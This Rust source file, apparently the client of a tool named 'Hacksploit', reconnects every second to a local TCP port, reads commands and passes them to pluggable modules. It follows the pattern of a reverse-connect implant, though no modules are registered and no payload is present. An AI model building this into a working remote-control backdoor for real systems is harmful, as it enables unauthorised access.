use std::io::{Error, Read, Write};
use std::net::TcpStream;
use std::boxed::Box;

pub trait HacksploitModule {
    fn on_command(&self, args: Vec<String>) -> String;
    fn get_name(&self) -> String;
}

pub struct HacksploitInstance {
    modules: Vec<Box<dyn HacksploitModule>>,
}

impl HacksploitInstance {
    pub fn new() -> Self {
        HacksploitInstance {
            modules: vec![],
        }
    }

    pub fn register_module<T>(&mut self, module: T) where 
        T: HacksploitModule + 'static
    {
        self.modules.push(Box::new(module));
    }

    fn on_command(&self, data: String) -> String {
        let arr: Vec<&str> = data.split_whitespace().collect();
        let command = arr.get(0);
        if command.is_none() {
            return String::from("unable to do it idk its weird \n");
        }
        let command = command.unwrap();
        let args = arr[1..].to_vec();
        for module in &self.modules {
            if command.to_lowercase().starts_with(&module.get_name()) {
                return module.on_command(args);
            }
        }
        String::new()
    }
}

fn main() {
    let interval = std::time::Duration::from_secs(1);
    loop {
        match start("127.0.0.1:1337") {
            Ok(_) => (),
            Err(e) => println!("Error: {}", e),
        }
        std::thread::sleep(interval);
    }
}

fn bytes_from_str(s: &str) -> Vec<u8> {
    return s.as_bytes().to_vec();
}

fn start(addr: &str) -> Result<(), Error> {
    let mut stream: TcpStream = TcpStream::connect(addr)?;
    let instance: HacksploitInstance = HacksploitInstance::new();
    loop {
        let mut buf = [0; 1024];
        match stream.read(&mut buf) {
            Ok(len) => {
                if len == 0 {
                    break;
                }
                let data = String::from_utf8(buf[..len].to_vec());
                match data {
                    Ok(data) => {
                        let response = bytes_from_str(&instance.on_command(data));
                        match stream.write(&response) {
                            Ok(_) => (),
                            Err(e) => {
                                println!("Error: {}", e);
                                break;
                            },
                        }
                        match stream.flush() {
                            Ok(_) => (),
                            Err(e) => {
                                println!("Error: {}", e);
                                break;
                            }
                        }
                    },
                    Err(e) => {
                        println!("Error: {}", e);
                        break;
                    }
                }
            },
            Err(e) => {
                println!("Error: {}", e);
                break;
            },
        }
    }
    Ok(())
}
